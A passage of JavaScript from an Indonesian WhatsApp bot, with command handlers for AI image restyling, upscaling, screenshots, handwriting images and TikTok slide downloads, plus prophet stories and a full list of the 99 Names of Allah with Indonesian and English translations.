        if (log) console.log(data);
        if (data?.code && data.code == 200 && data?.success && data.success == true) {
          let amba = data;
          amba.output.result.forEach((_, i) => {
            amba.output.result[i] = IMAGE_URL + amba.output.result[i]
          })
          promise.call(amba);
          promise = null;
        }
      }
    })
  })
}

function _send(payload, pr) {
  return new Promise(resolve => {
    wss.send(JSON.stringify(payload));
    if (pr) {
      promise = {
        once: true,
        call: resolve
      }
    } else {
      promise = {
        once: false,
        call: resolve
      }
    }
  })
}

async function PixNova(data, image, log) {
  let base64Image;
  if (/https\:\/\/|http\:\/\//i.test(image)) {
    const gs = await fetch(image);
    const kb = await gs.arrayBuffer();
    base64Image = Buffer.from(kb).toString("base64");
  } else if (Buffer.isBuffer(image)) {
    base64Image = image.toString("base64");
  } else {
    base64Image = image;
  }
  await _connect(log);
  let payload = {
    session_hash: SESSION
  }
  const resp = await _send(payload, true);
  if (log) console.log(`[ ${SESSION} ] Hash: ${JSON.stringify(resp, null, 2)}`);
  payload = {
    "data": {
      "source_image": `data:image/jpeg;base64,${base64Image}`,
      "strength": data?.strength || 0.6,
      "prompt": data.prompt,
      "negative_prompt": data.negative,
      "request_from": 2
    }
  }
  const out = await _send(payload, false);
  return out;
}
async function pomf2(filePath) {
    try {
        if (!fs.existsSync(filePath)) throw new Error("File tidak ditemukan");
        const contentType = mime.lookup(filePath) || "application/octet-stream";
        const fileName = path.basename(filePath);
        const ext = path.extname(filePath).toLowerCase();
        const form = new FormData();
        form.append("files[]", fs.createReadStream(filePath), {
            contentType,
            filename: fileName, // Paksa nama file tetap JPG
        });
        const response = await axios.post("https://qu.ax/upload.php", form, {
            headers: {
                ...form.getHeaders(),
            },
        });

        // Cek hasil
        if (!response.data.success || !response.data.files?.length) throw new Error("Upload gagal");
        
        return response.data.files[0].url;
    } catch (err) {
        console.error("Error:", err.message);
        return null;
    }
}
  const media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
  const IMAGE = await pomf2(media)
  console.log(IMAGE)
  const LOGGER = true; // Menampilkan teks ke console selama proses
  const DATA = {
    prompt: "(masterpiece), best quality",
    negative: "(worst quality, low quality:1.4), (greyscale, monochrome:1.1), cropped, lowres , username, blurry, trademark, watermark, title, multiple view, Reference sheet, curvy, plump, fat, strabismus, clothing cutout, side slit,worst hand, (ugly face:1.2), extra leg, extra arm, bad foot, text, name",
    strength: 0.6
  }

  const result = await PixNova(DATA, IMAGE, LOGGER) // Buffer, Base64 atau url
  TradzSigma.sendMessage(m.chat, { image: { url: result.output.result }, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
  console.log(JSON.stringify(result, null, 2))
}
break
case 'upscale': {
				if (m.sender in enhance) return reply(`Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.`);
				let q = m.quoted ? m.quoted : m;
				let mime = (q.msg || q).mimetype || q.mediaType || "";
				if (!mime) return reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`);
				if (!/image\/(jpe?g|png)/.test(mime)) 
					return reply(`Media tidak support!`);
				enhance[m.sender] = true;
				try {
					const availableScales = [2, 4, 6];
					let media = await q.download();
					let scale = availableScales.includes(parseInt(text)) ? parseInt(text) : 2;
					let tag = `@${m.sender.split("@")[0]}`;		
					let result = await upscale(media, scale);
					let caption = "🌟 *Effect*: HD\n";
					caption += `📩 *Requested by*: ${tag}\n`;
					caption += `✨ *Source*: imageupscaler.com\n`;
					caption += `🔍 *Skala*: ${scale}\n`;
					caption += `📏 *Available Scales*: ${availableScales.join(", ")}\n\n`;
					caption += "Terima kasih sudah menggunakan fitur ini ya, Bos! 😊";
			
					await TradzSigma.sendMessage(m.chat, {
						image: { url: result },
						caption: caption,
						mentions: [m.sender]
					}, { 
						quoted: m 
					});
				} catch (error) {
					console.error(error);
					reply("❌ Ups, terjadi kesalahan saat memproses gambar. Coba lagi nanti ya, Bos!");
				}
				delete enhance[m.sender];
				break;
			}

//=========================================\\
  case 'hd':
case 'remini':
case 'buathd': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!m.quoted) return replyviex(`Kirim Atau Reply Foto Dengan Caption *${prefix + command}*`)
let mime = (m.quoted.msg || m.quoted).mimetype || ''
if (!/image/.test(mime)) return replyviex(`Kirim Atau Reply Foto Dengan Caption *${prefix + command}*`)
m.reply('Bentar...')
const tempFile = path.join(__dirname, `temp_${Date.now()}.jpg`)
try {
let media = await m.quoted.download()
fs.writeFileSync(tempFile, media)
const uploadUguu = async (filePath) => {
return new Promise((resolve, reject) => {
exec(`curl -s -F files[]=@${filePath} https://uguu.se/upload.php`, (err, stdout) => {
if (err) return reject('Gagal Mengunggah Ke Uguu')
try {
let json = JSON.parse(stdout)
resolve(json.files[0].url)
} catch {
reject('Gagal Mengunggah Ke Uguu')
}
})
})}
let uploadedUrl = await uploadUguu(tempFile)
let apiUrl = `https://apizell.web.id/tools/hd?url=${encodeURIComponent(uploadedUrl)}`
let res = await fetch(apiUrl)
if (!res.ok) throw 'Gagal Mendapatkan Gambar Dari API'
let json = await res.json()
if (!json.status || !json.result?.upscaled) throw 'Gagal Memproses Gambar'
let buffer = await (await fetch(json.result.upscaled)).arrayBuffer()
let outputPath = path.join(__dirname, `hd_result_${Date.now()}.jpg`)
fs.writeFileSync(outputPath, Buffer.from(buffer))
await TradzSigma.sendMessage(m.chat, {
image: fs.readFileSync(outputPath),
caption: mess.success
}, { quoted: m })
fs.unlinkSync(tempFile)
fs.unlinkSync(outputPath)
} catch (e) {
console.log(e)
replyviex('Terjadi Kesalahan, Coba Lagi Nanti')
}
}
break
//=========================================\\
case 'ss':
case 'ssweb':{
if (!text) return replyviex(`mana linknya kak?`)
try {
TradzSigma.sendMessage(m.chat, { image: { url: `https://skizoasia.xyz/api/ssweb?type=mobile&url=${encodeURIComponent(text)}&apikey=nonogembul` }}, { quoted: m})
			} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
  case 'nulishitam': {
    if(!text) return reply('iya kak,  mau nulis apa? untuk menulis caranya begini ya\n> .nulis teks yang mau ditulis')
    TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try {
    TradzSigma.sendMessage(m.chat, { image: { url: `https://www.velyn.biz.id/api/tools/tulisbuku?prompt=${encodeURIComponent(text)}` }, caption: 'berhasil..' }, { quoted: m })
    } catch {
      reply('yah Error kak laporankan ke owner agar di perbaiki')
    }
  }
break;
//======================================================================
case 'nulis':
  case 'magernulis': {
    if(!text) return reply('iya kak,  mau nulis apa? untuk menulis caranya begini ya\n> .nulis nama|kelas|teks yang mau ditulis')
    nama = text.split('|')[0] ? text.split('|')[0] : '-'
    kelas = text.split('|')[1] ? text.split('|')[1] : '-'
    nulis = text.split('|')[2] ? text.split('|')[2] : '-'
    TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try {
    TradzSigma.sendMessage(m.chat, { image: { url: `https://api.siputzx.my.id/api/m/nulis?text=${encodeURIComponent(nulis)}&name=${encodeURIComponent(nama)}&class=${encodeURIComponent(kelas)}` }, caption: 'berhasil..' }, { quoted: m })
    } catch {
      reply('yah Error kak laporankan ke owner agar di perbaiki')
    }
  }
break;
case 'ttslide': case 'tiktokslide':{
if (!text) return replyviex(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://btch.us.kg/download/tiktokslide?url=${encodeURIComponent(text)}`)
for (let img of anu.result.images) {
  await TradzSigma.sendMessage(m.chat, { image: { url: img }, caption: anu.result.title }, { quoted: m })
}
await TradzSigma.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} catch (error) {
await TradzSigma.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
//=========================================\\
case 'kisahnabi': {
     if (!text) return replyviex(`Masukan nama nabi\nContoh: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return replyviex("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     replyviex(`${hasil}`)

}
break
//=========================================\\
const contoh = `*Asmaul Husna*
`
// data here
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`

case 'asmaulhusna': {
const asmaulhusna = [
    {
        index: 1,
        latin: "Ar Rahman",
        arabic: "الرَّحْمَنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemurah",
        translation_en: "The All Beneficent"
    },
    {
        index: 2,
        latin: "Ar Rahiim",
        arabic: "الرَّحِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Penyayang",
        translation_en: "The Most Merciful"
    },
    {
        index: 3,
        latin: "Al Malik",
        arabic: "الْمَلِكُ",
        translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
        translation_en: "The King, The Sovereign"
    },
    {
        index: 4,
        latin: "Al Quddus",
        arabic: "الْقُدُّوسُ",
        translation_id: "Yang Memiliki Mutlak sifat Suci",
        translation_en: "The Most Holy"
    },
    {
        index: 5,
        latin: "As Salaam",
        arabic: "السَّلاَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
        translation_en: "Peace and Blessing"
    },
    {
        index: 6,
        latin: "Al Mu’min",
        arabic: "الْمُؤْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
        translation_en: "The Guarantor"
    },
    {
        index: 7,
        latin: "Al Muhaimin",
        arabic: "الْمُهَيْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
        translation_en: "The Guardian, the Preserver"
    },
    {
        index: 8,
        latin: "Al ‘Aziiz",
        arabic: "الْعَزِيزُ",
        translation_id: "Yang Memiliki Mutlak Kegagahan",
        translation_en: "The Almighty, the Self Sufficient"
    },
    {
        index: 9,
        latin: "Al Jabbar",
        arabic: "الْجَبَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Perkasa",
        translation_en: "The Powerful, the Irresistible"
    },
    {
        index: 10,
        latin: "Al Mutakabbir",
        arabic: "الْمُتَكَبِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
        translation_en: "The Tremendous"
    },
    {
        index: 11,
        latin: "Al Khaliq",
        arabic: "الْخَالِقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pencipta",
        translation_en: "The Creator"
    },
    {
        index: 12,
        latin: "Al Baari’",
        arabic: "الْبَارِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
        translation_en: "The Maker"
    },
    {
        index: 13,
        latin: "Al Mushawwir",
        arabic: "الْمُصَوِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
        translation_en: "The Fashioner of Forms"
    },
    {
        index: 14,
        latin: "Al Ghaffaar",
        arabic: "الْغَفَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Pengampun",
        translation_en: "The Ever Forgiving"
    },
    {
        index: 15,
        latin: "Al Qahhaar",
        arabic: "الْقَهَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Memaksa",
        translation_en: "The All Compelling Subduer"
    },
    {
        index: 16,
        latin: "Al Wahhaab",
        arabic: "الْوَهَّابُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
        translation_en: "The Bestower"
    },
    {
        index: 17,
        latin: "Ar Razzaaq",
        arabic: "الرَّزَّاقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
        translation_en: "The Ever Providing"
    },
    {
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
    },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, Patron, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The Patron"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return replyviex (`contoh:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return replyviex(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
    }
